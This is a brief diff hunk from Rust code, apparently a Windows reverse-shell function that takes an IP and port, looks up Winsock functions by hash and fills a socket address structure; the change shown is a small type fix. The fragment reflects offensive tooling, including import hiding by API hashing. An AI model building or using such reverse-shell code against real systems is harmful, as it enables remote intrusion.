@@ -40,7 +40,7 @@ pub fn shell(ip: &str, port: u16) {
     // See line 42
     let function = rco_utils::find_function_address(ws2_32, 0xf6d69fad519d46a0).unwrap();
     let mut sockaddr_in = SOCKADDR_IN {
-        sin_family: AF_INET.0 as u16,
+        sin_family: AF_INET,
         ..Default::default()
     };
     let sin_addr_ptr: *mut c_void = &mut sockaddr_in.sin_addr as *mut _ as *mut c_void;
